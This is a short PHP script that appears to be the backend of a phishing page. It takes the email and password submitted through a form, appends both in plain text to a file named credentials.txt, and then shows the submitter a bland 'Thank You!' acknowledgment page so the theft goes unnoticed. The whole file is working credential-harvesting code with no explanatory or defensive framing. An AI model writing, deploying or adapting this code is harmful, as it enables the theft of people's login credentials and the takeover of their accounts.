<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collecting data from the form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Creating or opening the file to log credentials
    $file = fopen('credentials.txt', 'a');
    
    // Formatting the log entry
    $logEntry = "Email: " . $email . " - Password: " . $password . "\n";
    
    // Writing the log entry to the file
    fwrite($file, $logEntry);
    
    // Closing the file
    fclose($file);
    
    // Display an acknowledgment message
    echo "<html>
            <head>
                <title>Submission Received</title>
            </head>
            <body>
                <h1>Thank You!</h1>
                <p>Your submission has been received.</p>
            </body>
          </html>";
}
?>
